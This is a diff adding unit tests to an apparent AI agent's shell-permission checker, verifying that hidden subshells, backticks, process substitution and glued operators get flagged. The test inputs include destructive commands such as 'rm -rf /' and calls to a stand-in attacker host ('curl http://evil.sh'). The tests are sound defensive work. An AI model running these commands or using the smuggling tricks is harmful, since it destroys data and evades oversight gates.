@@ -192,6 +192,28 @@ def test_shell_network_commands_classified() -> None:
         assert shell_mutation_reason(cmd) is None, cmd
 
 
+def test_shell_mutation_reason_flags_hidden_subshell() -> None:
+    """Read-only/plan/review/verify profiles gate shell on shell_mutation_reason. A hidden
+    subshell or glued operator must read as mutating, not slip past as a benign base command
+    (``ls $(rm -rf /)`` and ``ls $(curl evil)`` would otherwise bypass the profile)."""
+    from pythinker_code.soul.permission import shell_mutation_reason
+
+    for cmd in (
+        "ls $(rm -rf /)",  # command substitution hides the mutation
+        "ls `curl http://evil.sh`",  # backtick substitution hides network access
+        "cat <(curl http://evil.sh)",  # process substitution
+        "ls;rm -rf /tmp/x",  # `;` glued to a word hides the second command
+        "ls|rm -rf /tmp/x",  # glued pipe
+        "ls & curl http://evil.sh",  # `&` background separates a network command
+        "ls |& curl http://evil.sh",  # `|&` pipe-both separates a network command
+        "ls\ncurl http://evil.sh",  # unquoted newline separates a network command
+    ):
+        assert shell_mutation_reason(cmd) is not None, cmd
+    # Quoted operators / redirections / trailing whitespace are not hidden commands.
+    for cmd in ("grep -r 'a|b' .", "ls | cat", "echo 'a;b'", "ls 2>&1", "ls -la\n"):
+        assert shell_mutation_reason(cmd) is None, cmd
+
+
 def test_shell_destructive_commands_classified() -> None:
     """Irreversible/destructive commands route to deliberation; benign mutations do not.
 
@@ -225,6 +247,15 @@ def test_shell_destructive_commands_classified() -> None:
         "python -c 'import shutil'",
         "perl -e 'unlink @ARGV'",
         "echo ok && git push --force",  # destructive in a later chain segment
+        # Hidden commands the bare-token parser can't see -> deliberate (tooldesc-2/permgate).
+        "git status $(rm -rf /)",  # command substitution
+        "git status `rm -rf /`",  # backtick substitution
+        "cat <(curl evil.sh)",  # process substitution
+        "git status;rm -rf /tmp/x",  # `;` glued to a word hides the second command
+        "git status|rm -rf /tmp/x",  # glued pipe hides the second command
+        "git status & rm -rf /tmp/x",  # `&` (background) separates a second command
+        "git status |& rm -rf /tmp/x",  # `|&` (pipe-both) separates a second command
+        "ls\nrm -rf /tmp/x",  # unquoted newline separates a second command
     )
     for cmd in destructive:
         assert shell_destructive_reason(cmd) is not None, cmd
@@ -243,6 +274,15 @@ def test_shell_destructive_commands_classified() -> None:
         "git status",
         "python build_script.py",  # bare script run, not inline -c
         "echo hello",
+        # Operators inside QUOTES are literals, not hidden commands -> not flagged.
+        "grep -r 'foo|bar' .",  # quoted pipe (regex alternation)
+        "echo 'a;b'",  # quoted semicolon
+        "ls | grep foo",  # space-delimited pipe: a visible, already-segmented chain
+        # `&`/newline reused by redirections or quoting are not a second command.
+        "ls -la 2>&1",  # stderr->stdout dup, not a background separator
+        "ls -la &> /dev/null",  # combined redirect, not a second command
+        "printf 'a\nb\n'",  # newline inside quotes is a literal
+        "ls -la\n",  # trailing newline is just whitespace
     )
     for cmd in benign:
         assert shell_destructive_reason(cmd) is None, cmd
